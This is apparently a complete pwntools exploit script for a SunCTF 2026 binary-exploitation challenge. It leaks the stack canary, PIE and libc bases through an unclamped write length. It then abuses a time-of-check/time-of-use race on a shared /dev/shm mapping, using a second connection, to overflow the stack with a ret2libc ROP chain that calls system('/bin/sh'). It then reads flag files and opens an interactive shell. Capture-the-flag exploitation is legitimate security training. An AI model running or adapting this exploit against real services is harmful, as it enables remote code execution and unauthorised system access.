#!/usr/bin/env python3
# Being Chalant Is Cool - SunCTF 2026
#
# OPEN <token> mmap()s /dev/shm/bc_<token> with MAP_SHARED, so two connections
# to the service map the SAME bytes. The record header is:
#     +0x00 magic "SHFT"   +0x08 u32 length   +0x10 record data
#
# Bug 1 (info leak, PEEK / sub_155c): the copy is clamped
#     __memcpy_chk(buf, rec+0x10, min(len,0x40), 0x40)
# but the echo is NOT:
#     write(1, buf, len)      <- full attacker-controlled u32
# so a large length dumps the stack past the 0x40 buffer: canary at +0x48,
# sub_155c's return address at +0x68 (PIE base) and __libc_start_main+0x80
# at +0x338 (libc base).
#
# Bug 2 (TOCTOU, RENDER / sub_147d): length is validated <= 0x40, then the
# program BLOCKS reading "GO", and only afterwards re-reads the length from the
# shared mapping to drive a byte-by-byte copy into a 0x60 stack frame. A second
# connection flips the length while the first is parked on that read -- the
# check and the use see different values. No timing luck required: the blocking
# read is the window.
import os
import sys
from pwn import *

context.binary = ELF("./ledger", checksec=False)
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

TOKEN = b"ch" + os.urandom(4).hex().encode()   # fresh /dev/shm file each run
PEEK_CANARY, PEEK_PIE, PEEK_LIBC = 0x48, 0x68, 0x338
RET_INTO_MAIN = 0x18E5              # sub_15e6+0x18e5: return site of the PEEK call
LSM_OFF = libc.sym["__libc_start_main"] + 0x80
CANARY_OFF, RBX_OFF, RETADDR_OFF = 0x48, 0x50, 0x58   # relative to record data


def cmd(io, line):
    io.recvuntil(b"\n> ")
    io.sendline(line)


def poke(io, off, data):
    """POKE is one input line (0x100 cap), so write the record in chunks."""
    for i in range(0, len(data), 64):
        chunk = data[i:i + 64]
        cmd(io, b"POKE 0x%x %s" % (off + i, chunk.hex().encode()))
        io.recvuntil(b"[*] ok")     # the write has LANDED, not merely been sent


def leak(io):
    cmd(io, b"OPEN " + TOKEN)
    poke(io, 8, p32(0x600))                       # oversized length -> stack dump
    cmd(io, b"PEEK")
    d = io.recvn(0x600)

    canary = u64(d[PEEK_CANARY:PEEK_CANARY + 8])
    pie = u64(d[PEEK_PIE:PEEK_PIE + 8]) - RET_INTO_MAIN

    libc_ptr = u64(d[PEEK_LIBC:PEEK_LIBC + 8])
    if (libc_ptr - LSM_OFF) & 0xFFF:              # layout shifted: go find it
        libc_ptr = next(v for v in (u64(d[o:o + 8]) for o in range(0x40, 0x600, 8))
                        if v >> 40 and not (v - LSM_OFF) & 0xFFF)
    libc.address = libc_ptr - LSM_OFF

    log.success(f"canary    = {canary:#x}")
    log.success(f"PIE base  = {pie:#x}")
    log.success(f"libc base = {libc.address:#x}")
    assert canary & 0xFF == 0, "canary should end in a NUL byte"
    assert pie & 0xFFF == 0 and libc.address & 0xFFF == 0, "bad leak"
    return canary


def exploit(io_a, io_b):
    canary = leak(io_a)

    # gadgets straight out of the ELF: pwntools' ROP() gadget cache is unusable
    # on this host's Python (safeeval chokes on 3.14 bytecode in the cache file)
    pop_rdi = next(libc.search(asm("pop rdi; ret"), executable=True))
    ret = next(libc.search(asm("ret"), executable=True))

    payload = flat({
        0:            b"RECEIPT" ,                 # first 6 bytes get echoed back
        CANARY_OFF:   p64(canary),
        RBX_OFF:      p64(0xDEADBEEF),
        RETADDR_OFF: [
            ret,                                   # movaps alignment
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            libc.sym["system"],
        ],
    }, filler=b"A")

    poke(io_a, 0x10, payload)
    poke(io_a, 8, p32(0x20))                       # small: passes the <=0x40 check
    cmd(io_a, b"RENDER")
    io_a.recvuntil(b"send GO to render\n")
    log.info("A parked on the GO read - check has passed")

    # --- the other side of the shared file ---
    cmd(io_b, b"OPEN " + TOKEN)
    io_b.recvuntil(b"[*] ledger mapped")
    poke(io_b, 8, p32(len(payload)))          # blocks until B's write is acked
    log.info(f"B flipped length to {len(payload)} underneath A")

    io_a.sendline(b"GO")                           # A now copies the new length
    io_a.recvuntil(b"[*] receipt ")
    log.success("overflowed - returning into ROP chain")
    return io_a


def spawn():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return remote("chalant.chal.sunwaycybersecurityclub.org", 9401)
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./ledger"])


if __name__ == "__main__":
    io_a, io_b = spawn(), spawn()
    exploit(io_a, io_b)
    io_a.sendline(b"id; cat flag* /flag* 2>/dev/null")
    io_a.interactive()
